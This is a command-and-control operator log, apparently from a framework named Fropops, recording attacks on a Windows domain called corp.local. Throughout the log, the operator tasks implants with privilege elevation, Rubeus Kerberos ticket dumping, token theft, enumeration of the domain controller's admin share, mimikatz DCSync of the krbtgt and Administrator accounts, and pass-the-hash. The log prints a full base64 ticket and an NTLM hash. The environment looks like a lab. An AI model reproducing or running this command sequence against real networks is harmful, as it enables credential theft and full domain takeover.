11/05/2023 11:28:29 | Info | Agent | 38a1670b68 |  | Agent Checking In
11/05/2023 09:32:19 | Info | User | Fropops-6272173e-b5b6-43a2-9242-9097e539ca68 | 99e59d84a5 | Command tasked to agent : elevate -p c:\users\fcastle -i -f installTool
11/05/2023 09:34:24 | Info | Agent | 8359149a3f |  | Agent Checking In
11/05/2023 09:36:52 | Info | User | Fropops-6272173e-b5b6-43a2-9242-9097e539ca68 | 8359149a3f | Command tasked to agent : elevate -p c:\users\fcastle -i -f installTool
11/05/2023 09:42:13 | Info | User | Fropops-6272173e-b5b6-43a2-9242-9097e539ca68 | 8359149a3f | Command tasked to agent : elevate -p c:\users\fcastle -i -f installTool
11/05/2023 09:55:01 | Info | Agent | f222316fc5 |  | Agent Checking In
11/05/2023 09:55:07 | Info | Agent | f222316fc5 |  | Agent Checking In
11/05/2023 09:55:38 | Info | User | Fropops-6272173e-b5b6-43a2-9242-9097e539ca68 | f222316fc5 | Command tasked to agent : elevate -p c:\users\fcastle -i -f installTool
11/05/2023 09:57:07 | Info | Agent | 0493dc43f8 |  | Agent Checking In
11/05/2023 09:57:31 | Info | User | Fropops-6272173e-b5b6-43a2-9242-9097e539ca68 | 0493dc43f8 | Command tasked to agent : get-system
11/05/2023 09:57:41 | Info | Agent | f458742cc2 |  | Agent Checking In
11/05/2023 09:59:25 | Info | User | Fropops-6272173e-b5b6-43a2-9242-9097e539ca68 | f458742cc2 | Command tasked to agent : execute-assembly /mnt/Share/Utils/win/AD/Rubeus.exe triage
11/05/2023 10:01:33 | Info | User | Fropops-6272173e-b5b6-43a2-9242-9097e539ca68 | f458742cc2 | Command tasked to agent : execute-assembly /mnt/Share/Utils/win/AD/Rubeus.exe triage
11/05/2023 10:51:21 | Info | User | Fropops-6272173e-b5b6-43a2-9242-9097e539ca68 | f458742cc2 | Command tasked to agent : execute-assembly /mnt/Share/Utils/win/AD/Rubeus.exe triage
11/05/2023 11:03:05 | Info | User | Fropops-6272173e-b5b6-43a2-9242-9097e539ca68 | f458742cc2 | Command tasked to agent : execute-assembly /mnt/Share/Utils/win/AD/Rubeus.exe dump /luid:0x17fda9 /service:krbtgt /nowrap
11/05/2023 11:04:27 | Info | User | Fropops-6272173e-b5b6-43a2-9242-9097e539ca68 | f458742cc2 | Command tasked to agent : execute-assembly /mnt/Share/Utils/win/AD/Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CORP/username:Administrator /password:FakePass /ticket:doIF0DCCBcygAwIBBaEDAgEWooIE1jCCBNJhggTOMIIEyqADAgEFoQwbCkNPUlAuTE9DQUyiHzAdoAMCAQKhFjAUGwZrcmJ0Z3QbCkNPUlAuTE9DQUyjggSSMIIEjqADAgESoQMCAQKiggSABIIEfIYjuGMcn8YqwLWQKAzZA0s6c65q7297JOQNYryPzJh8Jdq/++w+CaVObW/eQwK0JiTsNbfgil8oRmeTZWgUtLPVOpZk1M7iwazvVaksze+KgUY0z8zZmeB7Ifdg04xKp08JH3x/+KB9ytE5OHIFvEw5mRgD8/lQNDPSFPVe+8B/t4j9JlISPtnft97z4tIpDIOkzYY/eM72UpKXhrTG6U6vKf9z/PF7HgoYNwRwVa9nnPjo8jec18DAM6DYzBIM9KiQiRfmbMvHAD6af25YyDbgN+waMxSLtcxfn8JnFeOomQgmatAM5beGynY255KwZhO+D+mRDtXEwzQP2y6oiJh2kElEE4TcUCbv5jcEYN+sYat1L6dFZ9oN+41aOHMeyz0SkHZoSYHGpNFno555mVvzuepOmnh6TVgDL3v+hYetegXteVkZe2/KYRmLxY4HIJzfOUoh6vVeTC4q6aJ7i8Px1dfjPhk2tTv+k1mxaE8R5HvkTyJoybhoG/y44OvL5WeaQtDIHogo3XBjxkSsaaNFpL/3OWxwJqHtVZY5hn2rfhmaZnqjgO37nmezUdBYeCmIygyQ1q/EQN+X14AGPK7KvwXmH4s8Ewt1kRE+ZebkVMATzdaq+gWqzZcdy3F2RxvnznQF95bTRkrld2RhQKe7yTdbXx1HKUGbHsAF8g1tKshlWVL8geNs6+NqYjGpBrpMfY1uu1/e5YAfbbUsvkYYe6fYZ6uen/Sw40aXU76iij+vHZwrZL/P1l5VjKxp59h43IPjkooXqXKbxVQADjlz/T4Gt+5w9faa7dUueuJySsmjpAX/eHJxW58dnMYEtWM00RqTtPTSbmUhJUp2lbkp8Qv+srgBK5CkYDUDHtud12T936DjyTuIGvuhzXbNa6gKBxXWQ8cySSU5XGnqBkKpxwgwcihaC5GVmgYvgoOOHvWlUHgvkpR2CWS5d/AujNTEcww94aY69pKekF0hUX4bQuGUX7OXG40LJHEaYV6nE+bJlXpl/1QxQNscPgJP70gPeZ/x6DNv8VX/9Wp74H88HyeeYAYCM8fmYxvDq11eP+Z09HfpF6d7g7KdxOPFxkQ+LSZvxrf+mQtxQq8jJZ5Np1RlnqzpUHJR+2MgoSJnQxEH2mhEHRJ7R3xPLSTWfDDrDAdNe3PzdlWQitpRVSW0yNOKM0RgD7dPiMDkcwdfZ6Ip+NtVs0/tctE4O6yayiPhuamLnOnXRa2bYQS/IuP9RQ9p7KxK+u03E4spIIY6CC5ByRUt2gUk+LYnL4u6XnCu+qNmq6TogYyyrAcoh7oAYN/GkzyFZ07J8j8Qiwzi055I417/DcEw/RsXBmbNNCpqaYbKZEZxzEQYr4aX7SY5QevtDMt8LQCD2s1Rp3i8WAaVXIKJiIqrO9D4ovVG4dAHwui5D01Y70GMqwk9v8P0shPwQkSvoV45O2oZ380aOPe2hIKeE6Bjej1w4U8i/VvPjTXr7Jc2F0qAAuU1Qd2U/5gCNBPb1FCyw1R4p4kgAlce+35hKLDNGcoHo4HlMIHioAMCAQCigdoEgdd9gdQwgdGggc4wgcswgcigKzApoAMCARKhIgQgnX82ItUndq+enfl+Z3D69JqNK79yOKxEcHADFjyzgZihDBsKQ09SUC5MT0NBTKIaMBigAwIBAaERMA8bDUFkbWluaXN0cmF0b3KjBwMFAEDhAAClERgPMjAyMzA1MTExNDAxMDVaphEYDzIwMjMwNTEyMDAwMTA1WqcRGA8yMDIzMDUxODE0MDEwNVqoDBsKQ09SUC5MT0NBTKkfMB2gAwIBAqEWMBQbBmtyYnRndBsKQ09SUC5MT0NBTA==
11/05/2023 11:05:17 | Info | User | Fropops-6272173e-b5b6-43a2-9242-9097e539ca68 | f458742cc2 | Command tasked to agent : execute-assembly /mnt/Share/Utils/win/AD/Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CORP /username:Administrator /password:FakePass /ticket:doIF0DCCBcygAwIBBaEDAgEWooIE1jCCBNJhggTOMIIEyqADAgEFoQwbCkNPUlAuTE9DQUyiHzAdoAMCAQKhFjAUGwZrcmJ0Z3QbCkNPUlAuTE9DQUyjggSSMIIEjqADAgESoQMCAQKiggSABIIEfIYjuGMcn8YqwLWQKAzZA0s6c65q7297JOQNYryPzJh8Jdq/++w+CaVObW/eQwK0JiTsNbfgil8oRmeTZWgUtLPVOpZk1M7iwazvVaksze+KgUY0z8zZmeB7Ifdg04xKp08JH3x/+KB9ytE5OHIFvEw5mRgD8/lQNDPSFPVe+8B/t4j9JlISPtnft97z4tIpDIOkzYY/eM72UpKXhrTG6U6vKf9z/PF7HgoYNwRwVa9nnPjo8jec18DAM6DYzBIM9KiQiRfmbMvHAD6af25YyDbgN+waMxSLtcxfn8JnFeOomQgmatAM5beGynY255KwZhO+D+mRDtXEwzQP2y6oiJh2kElEE4TcUCbv5jcEYN+sYat1L6dFZ9oN+41aOHMeyz0SkHZoSYHGpNFno555mVvzuepOmnh6TVgDL3v+hYetegXteVkZe2/KYRmLxY4HIJzfOUoh6vVeTC4q6aJ7i8Px1dfjPhk2tTv+k1mxaE8R5HvkTyJoybhoG/y44OvL5WeaQtDIHogo3XBjxkSsaaNFpL/3OWxwJqHtVZY5hn2rfhmaZnqjgO37nmezUdBYeCmIygyQ1q/EQN+X14AGPK7KvwXmH4s8Ewt1kRE+ZebkVMATzdaq+gWqzZcdy3F2RxvnznQF95bTRkrld2RhQKe7yTdbXx1HKUGbHsAF8g1tKshlWVL8geNs6+NqYjGpBrpMfY1uu1/e5YAfbbUsvkYYe6fYZ6uen/Sw40aXU76iij+vHZwrZL/P1l5VjKxp59h43IPjkooXqXKbxVQADjlz/T4Gt+5w9faa7dUueuJySsmjpAX/eHJxW58dnMYEtWM00RqTtPTSbmUhJUp2lbkp8Qv+srgBK5CkYDUDHtud12T936DjyTuIGvuhzXbNa6gKBxXWQ8cySSU5XGnqBkKpxwgwcihaC5GVmgYvgoOOHvWlUHgvkpR2CWS5d/AujNTEcww94aY69pKekF0hUX4bQuGUX7OXG40LJHEaYV6nE+bJlXpl/1QxQNscPgJP70gPeZ/x6DNv8VX/9Wp74H88HyeeYAYCM8fmYxvDq11eP+Z09HfpF6d7g7KdxOPFxkQ+LSZvxrf+mQtxQq8jJZ5Np1RlnqzpUHJR+2MgoSJnQxEH2mhEHRJ7R3xPLSTWfDDrDAdNe3PzdlWQitpRVSW0yNOKM0RgD7dPiMDkcwdfZ6Ip+NtVs0/tctE4O6yayiPhuamLnOnXRa2bYQS/IuP9RQ9p7KxK+u03E4spIIY6CC5ByRUt2gUk+LYnL4u6XnCu+qNmq6TogYyyrAcoh7oAYN/GkzyFZ07J8j8Qiwzi055I417/DcEw/RsXBmbNNCpqaYbKZEZxzEQYr4aX7SY5QevtDMt8LQCD2s1Rp3i8WAaVXIKJiIqrO9D4ovVG4dAHwui5D01Y70GMqwk9v8P0shPwQkSvoV45O2oZ380aOPe2hIKeE6Bjej1w4U8i/VvPjTXr7Jc2F0qAAuU1Qd2U/5gCNBPb1FCyw1R4p4kgAlce+35hKLDNGcoHo4HlMIHioAMCAQCigdoEgdd9gdQwgdGggc4wgcswgcigKzApoAMCARKhIgQgnX82ItUndq+enfl+Z3D69JqNK79yOKxEcHADFjyzgZihDBsKQ09SUC5MT0NBTKIaMBigAwIBAaERMA8bDUFkbWluaXN0cmF0b3KjBwMFAEDhAAClERgPMjAyMzA1MTExNDAxMDVaphEYDzIwMjMwNTEyMDAwMTA1WqcRGA8yMDIzMDUxODE0MDEwNVqoDBsKQ09SUC5MT0NBTKkfMB2gAwIBAqEWMBQbBmtyYnRndBsKQ09SUC5MT0NBTA==
11/05/2023 11:05:50 | Info | User | Fropops-6272173e-b5b6-43a2-9242-9097e539ca68 | f458742cc2 | Command tasked to agent : steal-token 4640
11/05/2023 11:05:54 | Info | User | Fropops-6272173e-b5b6-43a2-9242-9097e539ca68 | f458742cc2 | Command tasked to agent : ps cmd
11/05/2023 11:06:19 | Info | User | Fropops-6272173e-b5b6-43a2-9242-9097e539ca68 | f458742cc2 | Command tasked to agent : ls \\corp-dc.corp.local\c$
11/05/2023 11:06:40 | Info | User | Fropops-6272173e-b5b6-43a2-9242-9097e539ca68 | f458742cc2 | Command tasked to agent : shell dir \\corp-dc.corp.local\c$
11/05/2023 11:06:52 | Info | User | Fropops-6272173e-b5b6-43a2-9242-9097e539ca68 | f458742cc2 | Command tasked to agent : ls \\corp-dc.corp.local\c$
11/05/2023 11:18:45 | Info | User | Fropops-6272173e-b5b6-43a2-9242-9097e539ca68 | f458742cc2 | Command tasked to agent : ls \\corp-dc.corp.local\c$
11/05/2023 11:20:53 | Info | User | Fropops-6272173e-b5b6-43a2-9242-9097e539ca68 | f458742cc2 | Command tasked to agent : execute-pe /mnt/Share/Utils/win/programs/mimikatz64.exe "lsadump::dcsync /domain:corp.local /user:krbtgt" exit
11/05/2023 11:21:19 | Info | User | Fropops-6272173e-b5b6-43a2-9242-9097e539ca68 | f458742cc2 | Command tasked to agent : execute-pe /mnt/Share/Utils/win/programs/mimikatz64.exe "lsadump::dcsync /domain:corp.local /user:krbtgt" exit
11/05/2023 11:22:02 | Info | User | Fropops-6272173e-b5b6-43a2-9242-9097e539ca68 | f458742cc2 | Command tasked to agent : execute-pe /mnt/Share/Utils/win/programs/mimikatz64.exe "lsadump::dcsync /domain:corp.local /user:krbtgt" exit
11/05/2023 11:22:39 | Info | User | Fropops-6272173e-b5b6-43a2-9242-9097e539ca68 | f458742cc2 | Command tasked to agent : sleep 0
11/05/2023 11:22:41 | Info | User | Fropops-6272173e-b5b6-43a2-9242-9097e539ca68 | f458742cc2 | Command tasked to agent : execute-pe /mnt/Share/Utils/win/programs/mimikatz64.exe "lsadump::dcsync /domain:corp.local /user:krbtgt" exit
11/05/2023 11:23:09 | Info | User | Fropops-6272173e-b5b6-43a2-9242-9097e539ca68 | f222316fc5 | Command tasked to agent : sleep 0
11/05/2023 11:23:37 | Info | User | Fropops-6272173e-b5b6-43a2-9242-9097e539ca68 | f458742cc2 | Command tasked to agent : execute-pe /mnt/Share/Utils/win/programs/mimikatz64.exe "lsadump::dcsync /domain:corp.local /user:krbtgt" exit
11/05/2023 11:24:08 | Info | User | Fropops-6272173e-b5b6-43a2-9242-9097e539ca68 | f458742cc2 | Command tasked to agent : execute-pe /mnt/Share/Utils/win/programs/mimikatz64.exe "privilege::debug" "lsadump::dcsync /domain:corp.local /user:krbtgt" exit
11/05/2023 11:24:21 | Info | User | Fropops-6272173e-b5b6-43a2-9242-9097e539ca68 | f458742cc2 | Command tasked to agent : execute-pe /mnt/Share/Utils/win/programs/mimikatz64.exe "privilege::debug" "token::elevate" "lsadump::dcsync /domain:corp.local /user:krbtgt" exit
11/05/2023 11:25:27 | Info | User | Fropops-6272173e-b5b6-43a2-9242-9097e539ca68 | f458742cc2 | Command tasked to agent : ls \\corp-dc.corp.local\c$
11/05/2023 11:25:52 | Info | User | Fropops-6272173e-b5b6-43a2-9242-9097e539ca68 | f458742cc2 | Command tasked to agent : execute-pe /mnt/Share/Utils/win/programs/mimikatz64.exe "lsadump::dcsync /domain:corp.local /user:krbtgt" exit
11/05/2023 11:28:41 | Info | User | Fropops-6272173e-b5b6-43a2-9242-9097e539ca68 | f458742cc2 | Command tasked to agent : ps
11/05/2023 11:29:38 | Info | User | Fropops-6272173e-b5b6-43a2-9242-9097e539ca68 | f458742cc2 | Command tasked to agent : migrate -pid 4484
11/05/2023 11:29:39 | Info | Agent | 6cb81bb756 |  | Agent Checking In
11/05/2023 11:29:47 | Info | User | Fropops-6272173e-b5b6-43a2-9242-9097e539ca68 | 6cb81bb756 | Command tasked to agent : execute-pe /mnt/Share/Utils/win/programs/mimikatz64.exe "lsadump::dcsync /domain:corp.local /user:krbtgt" exit
11/05/2023 11:29:52 | Info | User | Fropops-6272173e-b5b6-43a2-9242-9097e539ca68 | 6cb81bb756 | Command tasked to agent : execute-pe /mnt/Share/Utils/win/programs/mimikatz64.exe "lsadump::dcsync /domain:corp.local /user:krbtgt" exit
11/05/2023 11:29:57 | Info | User | Fropops-6272173e-b5b6-43a2-9242-9097e539ca68 | 6cb81bb756 | Command tasked to agent : execute-pe /mnt/Share/Utils/win/programs/mimikatz64.exe "lsadump::dcsync /domain:corp.local /user:krbtgt" exit
11/05/2023 11:31:28 | Info | User | Fropops-6272173e-b5b6-43a2-9242-9097e539ca68 | 6cb81bb756 | Command tasked to agent : execute-pe /mnt/Share/Utils/win/programs/mimikatz64.exe "lsadump::dcsync /domain:corp.local /user:Administrator" exit
11/05/2023 11:33:05 | Info | User | Fropops-6272173e-b5b6-43a2-9242-9097e539ca68 | 6cb81bb756 | Command tasked to agent : execute-pe /mnt/Share/Utils/win/programs/mimikatz64.exe "sekurlsa::pth /domain:corp.local /user:Administrator /ntlm:58a478135a93ac3bf058a5ea0e8fdb71 58a478135a93ac3bf058a5ea0e8fdb71" exit
11/05/2023 11:33:53 | Info | User | Fropops-6272173e-b5b6-43a2-9242-9097e539ca68 | 6cb81bb756 | Command tasked to agent : execute-pe /mnt/Share/Utils/win/programs/mimikatz64.exe "sekurlsa::pth /domain:corp.local /user:Administrator /ntlm:58a478135a93ac3bf058a5ea0e8fdb71 /run:'powershell -w hidden' exit
11/05/2023 11:34:05 | Info | User | Fropops-6272173e-b5b6-43a2-9242-9097e539ca68 | 6cb81bb756 | Command tasked to agent : execute-pe /mnt/Share/Utils/win/programs/mimikatz64.exe "sekurlsa::pth /domain:corp.local /user:Administrator /ntlm:58a478135a93ac3bf058a5ea0e8fdb71 /run:'powershell -w hidden' "exit
11/05/2023 11:34:40 | Info | User | Fropops-6272173e-b5b6-43a2-9242-9097e539ca68 | 6cb81bb756 | Command tasked to agent : execute-pe /mnt/Share/Utils/win/programs/mimikatz64.exe "sekurlsa::pth /domain:corp.local /user:Administrator /ntlm:58a478135a93ac3bf058a5ea0e8fdb71 /run:'powershell -w hidden'" exit
11/05/2023 11:36:56 | Info | User | Fropops-6272173e-b5b6-43a2-9242-9097e539ca68 | 6cb81bb756 | Command tasked to agent : execute-pe /mnt/Share/Utils/win/programs/mimikatz64.exe "sekurlsa::pth /domain:corp.local /user:Administrator /ntlm:58a478135a93ac3bf058a5ea0e8fdb71 /run:'powershell  "exit
11/05/2023 11:37:24 | Info | User | Fropops-6272173e-b5b6-43a2-9242-9097e539ca68 | 6cb81bb756 | Command tasked to agent : execute-pe /mnt/Share/Utils/win/programs/mimikatz64.exe "sekurlsa::pth /domain:corp.local /user:Administrator /ntlm:58a478135a93ac3bf058a5ea0e8fdb71" exit
11/05/2023 11:37:43 | Info | User | Fropops-6272173e-b5b6-43a2-9242-9097e539ca68 | 6cb81bb756 | Command tasked to agent : execute-pe /mnt/Share/Utils/win/programs/mimikatz64.exe "sekurlsa::pth /domain:corp.local /user:Administrator /ntlm:58a478135a93ac3bf058a5ea0e8fdb71" exit
11/05/2023 11:38:05 | Info | User | Fropops-6272173e-b5b6-43a2-9242-9097e539ca68 | 6cb81bb756 | Command tasked to agent : execute-pe /mnt/Share/Utils/win/programs/mimikatz64.exe "token:elevate" "sekurlsa::pth /domain:corp.local /user:Administrator /ntlm:58a478135a93ac3bf058a5ea0e8fdb71" exit
11/05/2023 11:38:12 | Info | User | Fropops-6272173e-b5b6-43a2-9242-9097e539ca68 | 6cb81bb756 | Command tasked to agent : execute-pe /mnt/Share/Utils/win/programs/mimikatz64.exe "token:elevate" "sekurlsa::pth /domain:corp.local /user:Administrator /ntlm:58a478135a93ac3bf058a5ea0e8fdb71" exit
11/05/2023 11:38:16 | Info | User | Fropops-6272173e-b5b6-43a2-9242-9097e539ca68 | 6cb81bb756 | Command tasked to agent : execute-pe /mnt/Share/Utils/win/programs/mimikatz64.exe "token:elevate" "sekurlsa::pth /domain:corp.local /user:Administrator /ntlm:58a478135a93ac3bf058a5ea0e8fdb71" exit
11/05/2023 11:38:33 | Info | User | Fropops-6272173e-b5b6-43a2-9242-9097e539ca68 | 6cb81bb756 | Command tasked to agent : execute-pe /mnt/Share/Utils/win/programs/mimikatz64.exe "token::elevate" "sekurlsa::pth /domain:corp.local /user:Administrator /ntlm:58a478135a93ac3bf058a5ea0e8fdb71" exit
11/05/2023 11:38:38 | Info | User | Fropops-6272173e-b5b6-43a2-9242-9097e539ca68 | 6cb81bb756 | Command tasked to agent : execute-pe /mnt/Share/Utils/win/programs/mimikatz64.exe "token::elevate" "sekurlsa::pth /domain:corp.local /user:Administrator /ntlm:58a478135a93ac3bf058a5ea0e8fdb71" exit
